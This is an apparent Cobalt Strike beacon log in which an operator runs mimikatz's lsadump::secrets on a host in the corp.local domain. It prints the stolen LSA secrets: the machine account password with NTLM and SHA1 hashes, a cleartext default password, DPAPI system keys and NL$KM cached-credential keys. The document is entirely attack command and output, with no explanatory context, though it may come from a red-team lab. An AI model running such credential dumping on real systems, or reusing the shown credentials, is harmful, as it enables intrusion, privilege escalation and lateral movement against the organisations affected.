```powershell
[12/07 13:32:31] beacon> mimikatz !lsadump::secrets
[12/07 13:32:33] [*] Tasked beacon to run mimikatz's !lsadump::secrets command
[12/07 13:32:33] [+] host called home, sent: 815428 bytes
[12/07 13:32:36] [+] received output:
Domain : WSADM
SysKey : 0227171ea0ee09d093667b75d0fadb90

Local name : WSADM ( S-1-5-21-1722741643-2714478462-3020786435 )
Domain name : CORP ( S-1-5-21-2291914956-3290296217-2402366952 )
Domain FQDN : corp.local

Policy subsystem is : 1.17
LSA Key(s) : 1, default {ca93a0ed-ac44-ace1-8536-568dadda027f}
  [00] {ca93a0ed-ac44-ace1-8536-568dadda027f} f5d21541dea9abed7fad5c5f313624c2a58528ea8f13326d0a60075cdce5d2ad

Secret  : $MACHINE.ACC
cur/text: M9f,Dzf*5tM9>'BjGhH`;KETEKLcQ;K&NQg/gGRGSJFs'Np\ah%(OB^aXLjNa[1eB"a>+U^<z`j'Ca"TZV=fm+BBDW&t/?0Hm)R>)ZkcswFkz:8PQFp*b!>4
    NTLM:19f221a69c0693ebfdc064393b55d509
    SHA1:ef3a26edd7e7533956cd121ad45839b7f8e58df9
old/text: M9f,Dzf*5tM9>'BjGhH`;KETEKLcQ;K&NQg/gGRGSJFs'Np\ah%(OB^aXLjNa[1eB"a>+U^<z`j'Ca"TZV=fm+BBDW&t/?0Hm)R>)ZkcswFkz:8PQFp*b!>4
    NTLM:19f221a69c0693ebfdc064393b55d509
    SHA1:ef3a26edd7e7533956cd121ad45839b7f8e58df9

Secret  : DefaultPassword
cur/text: Workstationadmin1!

Secret  : DPAPI_SYSTEM
cur/hex : 01 00 00 00 31 88 61 19 7d af 7e e8 e4 04 26 7b 8e 5a 64 38 15 56 24 6e 8c 35 88 5f cf 74 e5 51 b5 13 9a 77 42 80 8d d0 b6 2b 7c 27 
    full: 318861197daf7ee8e404267b8e5a64381556246e8c35885fcf74e551b5139a7742808dd0b62b7c27
    m/u : 318861197daf7ee8e404267b8e5a64381556246e / 8c35885fcf74e551b5139a7742808dd0b62b7c27
old/hex : 01 00 00 00 dd 9e 47 78 cc c3 dc e4 6f 49 14 00 89 54 fd db 9f d4 6e 7d 0c b5 2f ce 9e ba b9 68 5d 49 56 20 1f 3e 26 2c 2e 4f 6d 5e 
    full: dd9e4778ccc3dce46f4914008954fddb9fd46e7d0cb52fce9ebab9685d4956201f3e262c2e4f6d5e
    m/u : dd9e4778ccc3dce46f4914008954fddb9fd46e7d / 0cb52fce9ebab9685d4956201f3e262c2e4f6d5e

Secret  : L$_SQSA_S-1-5-21-1722741643-2714478462-3020786435-1001
cur/text: {"version":1,"questions":[]}

Secret  : NL$KM
cur/hex : fc 29 9a f7 e3 96 d5 39 fd ff 6a 8f 2e 6a ae 34 a1 d6 12 e6 81 8d 8e b2 5f c5 6f 4e d9 70 dc 1f a6 07 0d bd a6 71 75 d6 d0 ac 24 fb f3 00 dd 26 96 19 3b 2b a2 09 78 90 98 53 3e 02 06 0c 6e f0 
old/hex : fc 29 9a f7 e3 96 d5 39 fd ff 6a 8f 2e 6a ae 34 a1 d6 12 e6 81 8d 8e b2 5f c5 6f 4e d9 70 dc 1f a6 07 0d bd a6 71 75 d6 d0 ac 24 fb f3 00 dd 26 96 19 3b 2b a2 09 78 90 98 53 3e 02 06 0c 6e f0 

```